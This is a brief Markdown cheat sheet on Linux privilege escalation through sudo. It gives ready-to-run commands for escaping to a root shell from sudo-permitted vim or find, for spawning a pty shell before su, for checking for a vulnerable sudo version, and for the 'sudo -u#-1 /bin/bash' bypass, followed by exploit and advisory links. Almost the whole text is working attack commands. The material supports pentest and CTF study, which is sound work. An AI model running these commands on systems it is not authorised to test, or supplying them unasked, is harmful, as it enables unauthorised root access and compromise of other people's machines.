# Restricted Sudo: Privilege Escalation

1. If sudo allows **vim**

        sudo -l
        sudo vim <target_filename>
        :!/bin/bash

2. If sudo allows **find**

        sudo -l
        sudo find / -exec /bin/bash \;

3. If you have guessed password of **another user**

        $ python -c "import pty;pty.spawn('/bin/bash');"
        $ su username

## Vulneranble SUDO Version

* Check if the current **version** of **sudo** is vulnerable

        sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"

    If an output is obtained from the above command, then the installed sudo utility can be exploited to [gain root access](https://www.exploit-db.com/exploits/47502) on the target machine. 

        $ sudo -u#-1 /bin/bash

## References

* https://linuxaria.com/howto/linux-shell-how-to-use-the-exec-option-in-find-with-examples
* https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
* https://www.sudo.ws/alerts/pwfeedback.html
* https://arstechnica.com/information-technology/2020/02/serious-flaw-that-lurked-in-sudo-for-9-years-finally-gets-a-patch/
* https://www.exploit-db.com/exploits/47502
* https://devrant.com/rants/2282980/dont-quite-get-this-theres-some-bug-where-u-run-sudo-u-1-cmd-it-lets-you-run-it